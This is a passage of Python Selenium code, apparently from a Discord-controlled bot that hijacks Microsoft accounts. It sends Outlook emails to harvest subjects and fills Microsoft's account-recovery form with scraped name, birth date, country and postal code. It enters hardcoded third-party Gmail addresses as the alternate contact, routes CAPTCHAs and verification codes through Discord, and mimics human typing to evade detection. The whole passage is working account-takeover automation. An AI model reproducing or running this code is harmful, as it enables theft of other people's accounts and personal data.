                    self.log_signal.emit(f"Body JS generic search failed: {e}")

            if body_field is not None:
                # Human-like pause before typing body (slower)
                time.sleep(0.5)
                self._human_like_type(
                    body_field, random.choice(self.random_messages)
                )
                self.log_signal.emit("Entered random message.")
            else:
                self.log_signal.emit(
                    "[BOT] Could not locate Outlook message body even after fallbacks; "
                    "please type the email content manually for this run."
                )

            # Human-like pause before sending (slower)
            self.cpu_intensive_delay(0.5, 1.0)

            # We will attempt to send up to two times if Outlook complains that
            # the message has no recipients ("This message must have at least one recipient").
            for attempt in range(2):
                self.log_signal.emit(
                    f"Attempting to click 'Send' button (attempt {attempt + 1})..."
                )
                try:
                    send_button = self._wait_for_send_button_icon()
                    self.log_signal.emit("Clicking located Send button...")
                    send_button.click()
                except Exception as e_send_button:
                    self.log_signal.emit(
                        f"Send button locator/click failed: {e_send_button}. "
                        "Attempting CTRL+ENTER as a fallback..."
                    )
                    try:
                        ActionChains(self.driver).key_down(Keys.CONTROL).send_keys(
                            Keys.ENTER
                        ).key_up(Keys.CONTROL).perform()
                        self.log_signal.emit("Pressed CTRL+ENTER to send email.")
                    except Exception as e_ctrl:
                        self.log_signal.emit(
                            f"CTRL+ENTER fallback also failed: {e_ctrl}"
                        )
                        raise

                # Pause to let Outlook process the send or show any error banner
                time.sleep(1.0)

                # Check for "Couldn't send this message" error
                try:
                    if self.driver.find_elements(By.XPATH, "//*[contains(normalize-space(.), \"Couldn't send this message\")]"):
                        self.log_signal.emit("[BOT] Error: Outlook says 'Couldn't send this message'.")
                        return
                except Exception:
                    pass

                # Check for the specific error banner about having no recipients.
                try:
                    WebDriverWait(self.driver, 5).until(
                        EC.presence_of_element_located(
                            (
                                By.XPATH,
                                "//span[contains(., 'This message must have at least one recipient')]",
                            )
                        )
                    )
                    self.log_signal.emit(
                        "Outlook reported 'This message must have at least one recipient'. "
                        "Re-typing recipients and retrying send once."
                    )

                    # Try to re-locate the To field (composer is still open).
                    to_field_retry = self._find_to_field()
                    if not to_field_retry:
                        try:
                            to_field_retry = self.driver.switch_to.active_element
                        except Exception:
                            to_field_retry = None

                    if to_field_retry is None:
                        self.log_signal.emit(
                            "Could not re-locate 'To' field after error; aborting retry."
                        )
                        break

                    # Clear and re-type the recipients string.
                    try:
                        to_field_retry.clear()
                    except Exception:
                        try:
                            self.driver.execute_script(
                                "arguments[0].value = '';",
                                to_field_retry,
                            )
                        except Exception:
                            pass

                    self._human_like_type(to_field_retry, all_recipients_str)
                    self.log_signal.emit(
                        f"Re-entered recipients after error: {all_recipients_str}"
                    )

                    # Short pause before the next send attempt
                    self.cpu_intensive_delay(0.5, 1.0)

                    # Loop continues for second attempt, or exits after two tries.
                    continue

                except TimeoutException:
                    # Check for daily limit error before assuming success
                    daily_limit_detected = False
                    
                    # 1. Try explicit element lookup (more robust for modals)
                    try:
                        limit_xpath = (
                            "//*[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'daily limit') "
                            "or contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), \"message wasn't sent\") "
                            "or contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'saved it in your drafts')]"
                        )
                        if self.driver.find_elements(By.XPATH, limit_xpath):
                            daily_limit_detected = True
                    except Exception:
                        pass

                    # 2. Fallback to page source text check
                    if not daily_limit_detected:
                        try:
                            src = self.driver.page_source.lower()
                            limit_keywords = [
                                "daily limit", "daily message limit", "deter spammers",
                                "limits the number of messages", "saved in your drafts folder",
                                "saved it in your drafts folder", "message wasn't sent",
                                "upgrade to outlook"
                            ]
                            if any(x in src for x in limit_keywords):
                                daily_limit_detected = True
                        except Exception:
                            pass

                    if daily_limit_detected:
                        self.log_signal.emit("[BOT] Outlook Daily Limit Reached (Still Trying to Recover)")
                        self.collected_subjects = [
                            "Hello! I am automating some things.",
                            "Hey! This is Plan B",
                        ]
                        return

                    # Check for storage full error
                    try:
                        src = self.driver.page_source.lower()
                        storage_keywords = ["storage is full", "quota exceeded", "mailbox is full", "storage limit", "out of storage"]
                        if any(x in src for x in storage_keywords):
                            self.log_signal.emit("[BOT] Outlook Storage Is Full (Still Trying to Recover)")
                            self.collected_subjects = [
                                "Hello! I am automating some things.",
                                "Hey! This is Plan B",
                            ]
                            return
                    except Exception:
                        pass

                    # No error banner appeared; assume send succeeded.
                    self.log_signal.emit(
                        f"Email sent to {', '.join(target_emails_for_one_send)}"
                    )
                    break

        except Exception as e:
            self.log_signal.emit(f"Failed during email composition and sending: {e}")
            raise

        if len(self.collected_subjects) >= 1:
            # ensure exactly 2 subjects
            self.collected_subjects.append("Hey! This is Plan B")
            self.collected_subjects = self.collected_subjects[:2]
        else:
            self.log_signal.emit(
                "Warning: No subject was captured. Using two default subjects."
            )
            self.collected_subjects = [
                "Hello! I am automating some things.",
                "Hey! This is Plan B",
            ]

    def _initialize_recovery_form(self):
        """Navigates to recovery form and enters initial details."""
        if not self.driver:
            raise RuntimeError("WebDriver not initialized")
        self.progress_update_signal.emit(45, "Initializing recovery form...")
        self.log_signal.emit(
            "Navigating to Microsoft Recovery page (account.live.com/acsr)..."
        )

        # Navigate explicitly to the ACSR recovery URL.
        try:
            self.driver.get("https://account.live.com/acsr")
        except Exception as e:
            self.log_signal.emit(f"Error navigating to recovery page: {e}")
            raise

        # Try to detect the CAPTCHA image on the recovery page and emit a
        # full-page screenshot to Discord via captcha_image_signal. This is
        # best-effort and will not block the main flow if it fails.
        try:
            # Give the page a brief moment to render the CAPTCHA.
            time.sleep(1.0)

            captcha_img = None
            captcha_selectors = [
                # Microsoft ACSR visual challenge usually loads via GetHIPData.
                (By.XPATH, "//img[contains(@src, 'GetHIPData')]"),
                # Fallback: any img whose alt text mentions captcha.
                (
                    By.XPATH,
                    "//img[contains(translate(@alt, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'),'captcha')]",
                ),
            ]

            for by, selector in captcha_selectors:
                try:
                    captcha_img = WebDriverWait(self.driver, 5).until(
                        EC.presence_of_element_located((by, selector))
                    )
                    self.log_signal.emit(
                        f"[BOT] CAPTCHA image detected on recovery page using selector: {selector}"
                    )
                    break
                except TimeoutException:
                    continue
                except Exception:
                    continue

            if captcha_img is not None:
                try:
                    # Center the CAPTCHA in view, then capture only that element
                    self.driver.execute_script(
                        "arguments[0].scrollIntoView({block: 'center'});",
                        captcha_img,
                    )
                    time.sleep(random.uniform(0.8, 1.5))
                except Exception:
                    pass

                try:
                    # WebElement.screenshot_as_png returns a PNG of just the
                    # element bounds (no extra page chrome).
                    png_bytes = captcha_img.screenshot_as_png

                    if hasattr(self, "captcha_image_signal"):
                        self.captcha_image_signal.emit(png_bytes)
                        self.log_signal.emit(
                            "[BOT] CAPTCHA element screenshot captured and emitted to Discord handler."
                        )
                except Exception as e_cap:
                    self.log_signal.emit(
                        f"[BOT] Failed to capture or emit CAPTCHA screenshot: {e_cap}"
                    )

                # If a synchronous solver callback is configured (Discord
                # bot side), wait for the user's DM reply and type it into
                # the CAPTCHA input field.
                if getattr(self, "captcha_solver", None):
                    try:
                        self.log_signal.emit(
                            "[BOT] Waiting for CAPTCHA solution from Discord DM..."
                        )
                        answer = self.captcha_solver(
                            "CAPTCHA detected. Please reply in DM with the characters you see (5 minutes)."
                        )

                        # Sanitize the answer a bit: remove whitespace characters so
                        # accidental spaces/newlines from Discord do not cause a
                        # mismatch. Microsoft HIP captchas only use letters/numbers.
                        if answer is not None:
                            answer = re.sub(r"\s+", "", str(answer))

                        if answer:
                            try:
                                # Prefer a VISIBLE HIP input. Some pages include
                                # hidden honeypot fields whose id/name also contains
                                # 'hip'; typing into those would always fail.
                                def _find_visible_hip_input(drv):
                                    elems = drv.find_elements(
                                        By.XPATH,
                                        "//input[(contains(@id,'hip') or contains(@name,'hip') or "
                                        "contains(translate(@aria-label, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'),'characters'))]",
                                    )
                                    for el in elems:
                                        try:
                                            if el.is_displayed():
                                                return el
                                        except Exception:
                                            continue
                                    return False

                                captcha_input = WebDriverWait(self.driver, 60).until(
                                    _find_visible_hip_input
                                )

                                try:
                                    captcha_input.clear()
                                except Exception:
                                    pass

                                self._human_like_type(captcha_input, answer)
                                self.log_signal.emit(
                                    "[BOT] CAPTCHA answer received from Discord and typed into visible field."
                                )
                            except Exception as e_fill:
                                self.log_signal.emit(
                                    f"[BOT] Could not type CAPTCHA answer into field: {e_fill}"
                                )
                        else:
                            self.log_signal.emit(
                                "[BOT] No CAPTCHA answer received from Discord within timeout; continuing without auto-fill."
                            )
                    except Exception as e_wait:
                        self.log_signal.emit(
                            f"[BOT] Error while waiting for CAPTCHA answer from Discord: {e_wait}"
                        )
            else:
                self.log_signal.emit(
                    "[BOT] No obvious CAPTCHA image detected on recovery page."
                )
        except Exception as e:
            self.log_signal.emit(f"[BOT] CAPTCHA detection block failed: {e}")

        self.log_signal.emit("Waiting for AccountNameInput field...")
        self.log_signal.emit(
            "Please complete CAPTCHA + email verification in browser. "
            "The bot will auto-detect when to proceed."
        )
        account_name_input_field = WebDriverWait(self.driver, 60).until(
            EC.presence_of_element_located((By.ID, "AccountNameInput"))
        )
        self.log_signal.emit("AccountNameInput field found.")
        self.progress_update_signal.emit(50, "Recovery form loaded.")
        time.sleep(random.uniform(0.3, 0.6))

        if getattr(self, "email_addr", "Not Available") == "Not Available":
            self.log_signal.emit(
                "Primary email not found, cannot proceed with recovery."
            )
            raise Exception("Primary email for recovery not available.")

        self._human_like_type(account_name_input_field, self.email_addr)
        self.log_signal.emit(f"Entered primary email for recovery: {self.email_addr}")
        time.sleep(0.1)

        # Try to locate alternate email field explicitly if possible
        alt_field = None

        # First, prefer the specific ACSR "contact email" field XPath
        try:
            alt_field = self.driver.find_element(
                By.XPATH,
                "//input[@type='email' and not(@id='AccountNameInput')]",
            )
            self.log_signal.emit(
                "Alternate email field found using primary XPath selector."
            )
        except Exception:
            alt_field = None

        # Fallback: any generic email input on the page
        if alt_field is None:
            try:
                candidates = self.driver.find_elements(
                    By.CSS_SELECTOR, "input[type='email']"
                )
                if len(candidates) >= 2:
                    alt_field = candidates[1]
                elif candidates:
                    alt_field = candidates[0]
                if alt_field:
                    self.log_signal.emit(
                        "Alternate email field found using generic CSS selector."
                    )
            except Exception:
                alt_field = None

        if alt_field is None:
            # fallback: TAB once
            ActionChains(self.driver).send_keys(Keys.TAB).perform()
            time.sleep(0.1)
            alt_field = self.driver.switch_to.active_element

        # Prefer an alt email already set on the worker (e.g. from Discord input),
        # otherwise fall back to the previous random list.
        if getattr(self, "alt_email", None) and self.alt_email not in (
            "Recovery_Not_Attempted",
        ):
            chosen_alt_email = self.alt_email
        else:
            alt_emails_options = [
                "opsidianyt22@gmail.com",
                "khurshidiasmad22@gmail.com",
                "skylergamer180@gmail.com",
                "khurshidiahmad22@gmail.com",
            ]
            chosen_alt_email = random.choice(alt_emails_options)

        self._human_like_type(alt_field, chosen_alt_email)
        self.alt_email = chosen_alt_email
        self.log_signal.emit(f"Entered alternate contact email: {self.alt_email}")
        self.progress_update_signal.emit(55, "Alternate email entered.")

        # Move focus to next section (optimized)
        for _ in range(4):
            ActionChains(self.driver).send_keys(Keys.TAB).perform()
            time.sleep(0.1)

        # After filling the primary and alternate email and moving focus,
        # automatically click the ACSR "Next" button so that Microsoft sends
        # the verification code to the alternate email. The subsequent
        # _wait_for_email_code_and_fill() call will then DM the user for that
        # code and type it into the verification page.
        try:
            self.log_signal.emit("[BOT] Looking for 'Next' control on recovery form to continue...")

            next_btn = None

            # 1) Prefer the exact input you showed: id=recoveryPlusLandingAction
            try:
                next_btn = WebDriverWait(self.driver, 10).until(
                    EC.element_to_be_clickable(
                        (By.XPATH, "//input[@id='recoveryPlusLandingAction']")
                    )
                )
            except Exception:
                next_btn = None

            # 2) Fallback: any submit input with value="Next"
            if next_btn is None:
                try:
                    next_btn = WebDriverWait(self.driver, 10).until(
                        EC.element_to_be_clickable(
                            (
                                By.XPATH,
                                "//input[@type='submit' and normalize-space(@value)='Next']",
                            )
                        )
                    )
                except Exception:
                    next_btn = None

            # 3) Fallback: legacy button with text Next
            if next_btn is None:
                try:
                    next_btn = WebDriverWait(self.driver, 10).until(
                        EC.element_to_be_clickable(
                            (By.XPATH, "//button[normalize-space(text())='Next']")
                        )
                    )
                except Exception:
                    next_btn = None

            # 4) Last resort: any button or submit input containing Next
            if next_btn is None:
                next_btn = WebDriverWait(self.driver, 10).until(
                    EC.element_to_be_clickable(
                        (
                            By.XPATH,
                            "//button[contains(normalize-space(.), 'Next')] | "
                            "//input[@type='submit' and contains(normalize-space(@value), 'Next')]",
                        )
                    )
                )

            try:
                self.driver.execute_script(
                    "arguments[0].scrollIntoView({block: 'center'});",
                    next_btn,
                )
            except Exception:
                pass

            clicked = False
            try:
                ActionChains(self.driver).move_to_element(next_btn).click().perform()
                clicked = True
            except Exception:
                try:
                    self.driver.execute_script("arguments[0].click();", next_btn)
                    clicked = True
                except Exception:
                    pass

            if clicked:
                self.log_signal.emit("[BOT] Clicked 'Next' button on recovery form to request email code.")

                # Short wait, then check if the page reports that the CAPTCHA
                # was incorrect (common message: "didn't match the picture").
                # If so, inform the user and re-run the recovery form once so
                # that a new CAPTCHA image is generated and sent to Discord.
                try:
                    time.sleep(3.0)
                    captcha_error = None
                    try:
                        captcha_error = WebDriverWait(self.driver, 5).until(
                            EC.presence_of_element_located(
                                (
                                    By.XPATH,
                                    "//*[contains(normalize-space(.), \"didn't match the picture\") or "
                                    "contains(normalize-space(.), 'characters you see do not match') or "
                                    "contains(normalize-space(.), 'try again') ]",
                                )
                            )
                        )
                    except TimeoutException:
                        captcha_error = None

                    if captcha_error is not None and captcha_error.is_displayed():
                        self.log_signal.emit(
                            "[BOT] CAPTCHA appears to be incorrect. Requesting a new CAPTCHA and notifying user."
                        )

                        if not getattr(self, "_acsr_captcha_retried", False):
                            self._acsr_captcha_retried = True
                            self._initialize_recovery_form()
                            return
                except Exception as e_check:
                    self.log_signal.emit(
                        f"[BOT] Error while checking for CAPTCHA error state: {e_check}"
                    )
        except Exception as e:
            self.log_signal.emit(f"[BOT] Error while trying to click 'Next' on recovery form: {e}")

    def _wait_for_identity_form_and_fill(self):
        """Waits for the identity verification form to appear and then fills it."""
        if not self.driver:
            raise RuntimeError("WebDriver not initialized")
        self.progress_update_signal.emit(60, "Waiting for identity verification form...")
        dob_field_found = False
        wait_start_time = time.time()
        timeout_duration = 6.9 * 60
        check_interval = 5  # Check every 5 seconds

        while time.time() - wait_start_time < timeout_duration:
            try:
                WebDriverWait(self.driver, check_interval).until(
                    EC.presence_of_element_located((By.ID, "BirthDate_monthInput"))
                )
                dob_field_found = True
                break
            except TimeoutException:
                elapsed = time.time() - wait_start_time
                if elapsed % 30 < check_interval:  # Log every ~30 seconds
                    self.log_signal.emit(
                        f"Still waiting for identity form... ({int(elapsed)}s elapsed)"
                    )
                time.sleep(check_interval)
            except Exception as e:
                self.log_signal.emit(f"Error while waiting for identity form: {e}")
                time.sleep(check_interval)

        if not dob_field_found:
            self.log_signal.emit(
                "Timeout: Identity form (DOB fields) did not appear within 6.9 minutes. "
                "Please manually fill or restart."
            )
            raise Exception("Identity form did not appear.")
        else:
            self.log_signal.emit(
                "✅ Identity verification form loaded successfully! Auto-filling..."
            )
            self.progress_update_signal.emit(
                65, "Identity form loaded. Auto-filling details..."
            )
            self._fill_identity_details()

    def _fill_identity_details(self):
        """Fills the identity verification form with scraped data."""
        if not self.driver:
            self.log_signal.emit(
                "❌ Error: WebDriver is not initialized for identity verification. "
                "Browser might have been closed prematurely."
            )
            raise Exception("WebDriver not initialized.")

        self.log_signal.emit("▶️ Identity form filling initiated automatically.")
        self.log_signal.emit("[DEBUG] Current scraped values:")
        self.log_signal.emit(f"  First Name: {self.first_name}")
        self.log_signal.emit(f"  Last Name: {self.last_name}")
        self.log_signal.emit(f"  DOB: {self.dob}")
        self.log_signal.emit(f"  Country: {self.country}")
        self.log_signal.emit(f"  Postal: {self.postal}")

        all_data_missing = (
            (self.first_name == "Not Available" or not (self.first_name or "").strip())
            and (self.last_name == "Not Available" or not (self.last_name or "").strip())
            and (self.dob == "Not Available" or not (self.dob or "").strip())
            and (self.country == "Not Available" or not (self.country or "").strip())
            and (not (self.postal or "").strip())
        )

        if all_data_missing:
            self.log_signal.emit(
                "❌ Error: All critical identity information is missing. "
                "Cannot proceed with form filling."
            )
            raise Exception("All identity data missing.")

        self.progress_update_signal.emit(70, "Entering personal details...")

        # FIRST NAME
        try:
            first_name_field = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located(
                    (By.XPATH, "//input[@id='FirstNameInput']")
                )
            )
            if self.first_name != "Not Available" and (self.first_name or "").strip():
                try:
                    first_name_field.clear()
                except Exception:
                    pass
                self._human_like_type(first_name_field, self.first_name)
                self.log_signal.emit(f"Entered First Name: {self.first_name}")
            else:
                self.log_signal.emit("Skipping First Name: data not available.")
        except Exception as e:
            self.log_signal.emit(
                f"⚠️ First name field not found or input failed: {e}"
            )

        time.sleep(0.1)  # Reduced delay

        # LAST NAME
        self.log_signal.emit("Tabbing to Last Name field...")
        ActionChains(self.driver).send_keys(Keys.TAB).perform()
        time.sleep(0.1)  # Reduced delay

        if self.last_name != "Not Available" and (self.last_name or "").strip():
            try:
                last_name_field = self.driver.switch_to.active_element
                try:
                    last_name_field.clear()
                except Exception:
                    pass
                self._human_like_type(last_name_field, self.last_name)
                self.log_signal.emit(
                    f"Entered Last Name (into active element): {self.last_name}"
                )
            except Exception as e:
                self.log_signal.emit(
                    f"⚠️ Could not type last name into active element: {e}"
                )
        else:
            self.log_signal.emit("Skipping Last Name: data not available.")

        time.sleep(0.5)

        # DOB
        if self.dob and "/" in self.dob and self.dob != "Not Available":
            try:
                m, d, y = self.dob.split("/")
                month_select = Select(
                    WebDriverWait(self.driver, 10).until(
                        EC.presence_of_element_located(
                            (By.ID, "BirthDate_monthInput")
                        )
                    )
                )
                time.sleep(0.1)  # Reduced delay
                month_select.select_by_value(m.lstrip("0"))
                time.sleep(0.1)  # Reduced delay

                day_select = Select(
                    WebDriverWait(self.driver, 10).until(
                        EC.presence_of_element_located((By.ID, "BirthDate_dayInput"))
                    )
                )
                day_select.select_by_value(d.lstrip("0"))
                time.sleep(0.1)  # Reduced delay

                year_select = Select(
                    WebDriverWait(self.driver, 10).until(
                        EC.presence_of_element_located(
                            (By.ID, "BirthDate_yearInput")
                        )
                    )
                )
                year_select.select_by_value(y)
                self.log_signal.emit(f"Entered DOB: {m}/{d}/{y}")
            except Exception as e_dob:
                self.log_signal.emit(f"⚠️ Failed to enter DOB parts: {e_dob}")
        else:
            self.log_signal.emit(
                "Skipping DOB: data not available or invalid format."
            )

        time.sleep(0.1)  # Reduced delay

        # COUNTRY
        country_to_select = (
            self.country if self.country != "Not Available" else "United States"
        )
        if self.country != "Not Available" and (self.country or "").strip():
            try:
                country_select = Select(
                    WebDriverWait(self.driver, 10).until(
                        EC.presence_of_element_located((By.ID, "CountryInput"))
                    )
                )
                country_select.select_by_visible_text(country_to_select)
                self.log_signal.emit(f"Selected Country: {country_to_select}")
            except Exception as e:
                self.log_signal.emit(
                    f"⚠️ Country '{country_to_select}' not selectable or field not found: {e}"
                )
        else:
            self.log_signal.emit("Skipping Country: data not available.")

        time.sleep(0.1)  # Reduced delay
        self.progress_update_signal.emit(75, "Entering country and checking for state...")

        # STATE (best-effort, mostly for US)
        try:
            state_select_element = WebDriverWait(self.driver, 5).until(
                EC.presence_of_element_located((By.ID, "StateInput"))
            )
            state_select = Select(state_select_element)
            options = [
                option.text
                for option in state_select.options
                if option.text and option.text != "Select..."
            ]
            if options:
                state_value = options[0]
                state_select.select_by_visible_text(state_value)
                self.log_signal.emit(f"Selected State: {state_value}")
            else:
                self.log_signal.emit("No selectable states found in the dropdown.")
        except Exception as e_state:
            self.log_signal.emit(
                f"⚠️ State field not found or could not select state (skipping): {e_state}"
            )

        time.sleep(0.1)  # Reduced delay
        self.progress_update_signal.emit(80, "Filling postal code and final steps...")

        # POSTAL CODE (we will only type if self.postal is set; extraction
        # may skip non-US countries so that invalid formats don't get auto-filled).
        if self.postal and (self.postal or "").strip():
            try:
                postal_field = WebDriverWait(self.driver, 10).until(
                    EC.presence_of_element_located(
                        (By.XPATH, "//input[@id='PostalCodeInput']")
                    )
                )
                try:
                    postal_field.clear()
                except Exception:
                    pass
                postal_field.click()
                self.log_signal.emit("Clicked Postal Code field.")
                self._human_like_type(postal_field, self.postal)
                self.log_signal.emit(f"Entered Postal Code: {self.postal}")
            except Exception as e_postal:
                self.log_signal.emit(
                    f"⚠️ Postal code field not found or input failed: {e_postal}"
                )
        else:
            self.log_signal.emit("Skipping Postal Code: data not available.")

        time.sleep(0.1)  # Reduced delay

        # Click Next button explicitly
        try:
            next_btn = WebDriverWait(self.driver, 5).until(
                EC.element_to_be_clickable((By.ID, "NextButton"))
            )
            next_btn.click()
            self.log_signal.emit("Clicked 'Next' button.")
        except Exception:
            try:
                next_btn = self.driver.find_element(By.XPATH, "//input[@type='submit' or @value='Next' or @value='Save']")
                next_btn.click()
                self.log_signal.emit("Clicked 'Next' button (fallback).")
            except Exception:
                ActionChains(self.driver).send_keys(Keys.ENTER).perform()
                self.log_signal.emit("Pressed Enter (fallback).")

        self.progress_update_signal.emit(85, "Completing final form fields...")

    def _handle_product_option_mail(self):
        """Waits for and interacts with ProductOptionMail checkbox and password field."""
        if not self.driver:
            raise RuntimeError("WebDriver not initialized")
        self.log_signal.emit("Waiting for ProductOptionMail checkbox to appear...")
        self.progress_update_signal.emit(90, "Handling ProductOptionMail and password...")
        try:
            checkbox = WebDriverWait(self.driver, 300).until(
                EC.presence_of_element_located((By.ID, "ProductOptionMail"))
            )
            self.log_signal.emit("ProductOptionMail checkbox found!")

            time.sleep(0.1)  # Reduced delay

            password_field = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located(
                    (By.XPATH, "//input[@type='password' or @name='Password']")
                )
            )
            self._human_like_type(password_field, self.account_password)
            self.log_signal.emit("Entered account password")

            time.sleep(0.1)  # Reduced delay

            checkbox.click()
            self.log_signal.emit("Clicked ProductOptionMail checkbox")

            time.sleep(0.1)  # Reduced delay

            ActionChains(self.driver).send_keys(Keys.ENTER).perform()
            self.log_signal.emit("Pressed Enter after checkbox")

        except Exception as e_checkbox:
            self.log_signal.emit(
                f"Error handling ProductOptionMail checkbox or password field: {e_checkbox}"
            )
            raise

    def _perform_final_email_sequence(self):
        """Enters additional email addresses and subjects (replacing messages)."""
        if not self.driver:
            raise RuntimeError("WebDriver not initialized")
        self.log_signal.emit("Starting final email and subject sequence...")
        self.progress_update_signal.emit(95, "Entering final emails and subjects...")
        time.sleep(0.5)  # Reduced delay

        emails_to_enter = self.collected_emails[:3]
        if len(emails_to_enter) < 3:
            # Fallback to known target emails if collection failed
            for email in self.target_emails:
                if len(emails_to_enter) < 3 and email not in emails_to_enter:
                    emails_to_enter.append(email)
            while len(emails_to_enter) < 3:
                emails_to_enter.append(
                    emails_to_enter[-1] if emails_to_enter else "example@example.com"
                )

        if len(self.collected_subjects) < 2:
            defaults = [
                "Hello! I am automating some things.",
                "Hey! This is Plan B",
            ]
            while len(self.collected_subjects) < 2:
                self.collected_subjects.append(
                    defaults[len(self.collected_subjects) % len(defaults)]
                )

        try:
            email_field1 = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located(
                    (
                        By.XPATH,
                        "(//input[contains(@type, 'email') or contains(@type, 'text')])[1]",
                    )
                )
            )
            self._human_like_type(email_field1, emails_to_enter[0])
            self.log_signal.emit(f"Entered first email: {emails_to_enter[0]}")
        except Exception as e:
            self.log_signal.emit(f"Could not find/enter first email: {e}")
        time.sleep(0.1)  # Reduced delay

        ActionChains(self.driver).send_keys(Keys.TAB).perform()
        time.sleep(0.1)  # Reduced delay

        try:
            email_field2 = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located(
                    (
                        By.XPATH,
                        "(//input[contains(@type, 'email') or contains(@type, 'text')])[2]",
                    )
                )
            )
            self._human_like_type(email_field2, emails_to_enter[1])
            self.log_signal.emit(f"Entered second email: {emails_to_enter[1]}")
        except Exception as e:
            self.log_signal.emit(f"Could not find/enter second email: {e}")
        time.sleep(0.1)  # Reduced delay

        ActionChains(self.driver).send_keys(Keys.TAB).perform()
        time.sleep(0.1)  # Reduced delay

        try:
            email_field3 = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located(
                    (
                        By.XPATH,
                        "(//input[contains(@type, 'email') or contains(@type, 'text')])[3]",
                    )
                )
            )
            self._human_like_type(email_field3, emails_to_enter[2])
            self.log_signal.emit(f"Entered third email: {emails_to_enter[2]}")
        except Exception as e:
            self.log_signal.emit(f"Could not find/enter third email: {e}")
        time.sleep(0.1)  # Reduced delay

        self.log_signal.emit("Pressing TAB twice to reach first subject field...")
        ActionChains(self.driver).send_keys(Keys.TAB).perform()
        time.sleep(0.1)  # Reduced delay
        ActionChains(self.driver).send_keys(Keys.TAB).perform()
        time.sleep(0.1)  # Reduced delay

        first_subject = self.collected_subjects[0]
        self.log_signal.emit(f"Entering first subject: '{first_subject}'")
        try:
            current_active_element = self.driver.switch_to.active_element
            self._human_like_type(current_active_element, first_subject)
        except Exception as e:
            self.log_signal.emit(
                f"Could not find active element for first subject or input failed: {e}"
            )
            ActionChains(self.driver).send_keys(first_subject).perform()
        time.sleep(0.1)  # Reduced delay

        ActionChains(self.driver).send_keys(Keys.TAB).perform()
        time.sleep(0.1)  # Reduced delay

        second_subject = self.collected_subjects[1]
        self.log_signal.emit(f"Entering second subject: '{second_subject}'")
        try:
            current_active_element = self.driver.switch_to.active_element
            self._human_like_type(current_active_element, second_subject)
        except Exception as e:
            self.log_signal.emit(
                f"Could not find active element for second subject or input failed: {e}"
            )
            ActionChains(self.driver).send_keys(second_subject).perform()
        time.sleep(0.1)  # Reduced delay

        self.log_signal.emit("Attempting to submit the final recovery form...")
        try:
            # Try finding the Next/Submit button explicitly
            submit_btn = None
            selectors = [
                (By.ID, "SubmitButton"),
                (By.ID, "NextButton"),
                (By.XPATH, "//input[@type='submit']"),
                (By.XPATH, "//button[contains(translate(., 'S', 's'), 'submit')]"),
                (By.XPATH, "//button[contains(translate(., 'N', 'n'), 'next')]"),
            ]
            
            for by, val in selectors:
                try:
                    submit_btn = WebDriverWait(self.driver, 2).until(EC.element_to_be_clickable((by, val)))
                    break
                except:
                    continue
            
            if submit_btn:
                self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", submit_btn)
                try:
                    submit_btn.click()
                except:
                    self.driver.execute_script("arguments[0].click();", submit_btn)
                self.log_signal.emit("Clicked Submit/Next button.")
            else:
                self.log_signal.emit("Submit button not found, falling back to Enter key.")
                ActionChains(self.driver).send_keys(Keys.ENTER).perform()

            # Wait for success confirmation
            try:
                WebDriverWait(self.driver, 30).until(
                    lambda d: "received your request" in d.page_source.lower() or "submitted" in d.page_source.lower()
                )
                self.log_signal.emit("✅ Form submission confirmed (Success page detected).")
                time.sleep(5)
            except:
                self.log_signal.emit("⚠️ Warning: Did not detect success page immediately. Double-checking...")
                time.sleep(5)
                
        except Exception as e:
            self.log_signal.emit(f"Error during final submission: {e}")

    def _wait_for_email_code_and_fill(self):
        """Waits for the verification code sent to the alternate email and fills it.

        This relies on a synchronous code_solver callback provided by the
        Discord layer. The callback is expected to block until the user sends
        the code in DM (or times out) and then return the code string.
        """
        if not self.driver:
            raise RuntimeError("WebDriver not initialized")

        if not getattr(self, "code_solver", None):
            self.log_signal.emit(
                "[BOT] No email-code solver callback configured; skipping email code entry."
            )
            return

        self.log_signal.emit(
            "[BOT] Waiting for security code that Microsoft sent to the alternate email..."
        )

        try:
            code = self.code_solver(
                "Microsoft sent a security code to your alternate email. "
                "Reply here with that code (10 minutes)."
            )
        except Exception as e:
            self.log_signal.emit(
                f"[BOT] Error while waiting for email verification code from Discord: {e}"
            )
            return

        if not code:
            self.log_signal.emit(
                "[BOT] No verification code received from Discord; continuing without entering it."
            )
            return

        try:
            code_input = WebDriverWait(self.driver, 120).until(
                EC.presence_of_element_located(
                    (
                        By.XPATH,
                        "//input[(@type='tel' or @type='text') and (contains(@id,'code') or contains(@name,'code') or contains(translate(@aria-label, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'),'code'))]",
                    )
                )
            )
            self._human_like_type(code_input, code)
            self.log_signal.emit(
                "[BOT] Entered verification code from Discord into code field."
            )
            try:
                ActionChains(self.driver).send_keys(Keys.ENTER).perform()
                self.log_signal.emit("[BOT] Pressed Enter after entering verification code.")
            except Exception:
                pass
        except Exception as e_fill:
            self.log_signal.emit(
                f"[BOT] Failed to enter verification code into field: {e_fill}"
            )

    def run_for_discord(self, alt_email=None):
        """Run the main flow once for Discord (no Qt dialogs/event loops)."""
        if alt_email:
            self.alt_email = alt_email
        try:
            self.log_signal.emit(
                "[BOT] Starting scraping process with CPU optimization and human-like typing..."
            )
            self._initialize_driver()
            self._perform_login_check()
            self._extract_profile_info()
            self._extract_postal_code()
            try:
                self._process_outlook_sent_items()
            except Exception as e:
                self.log_signal.emit(f"[BOT] Outlook error: {e}. Continuing to recovery...")
                if not self.collected_subjects:
                    self.collected_subjects = [
                        "Hello! I am automating some things.",
                        "Hey! This is Plan B",
                    ]

            self._initialize_recovery_form()
            # Wait for user-provided email code (if callback configured) before
            # moving on to the identity form.
            self._wait_for_email_code_and_fill()
            self._wait_for_identity_form_and_fill()
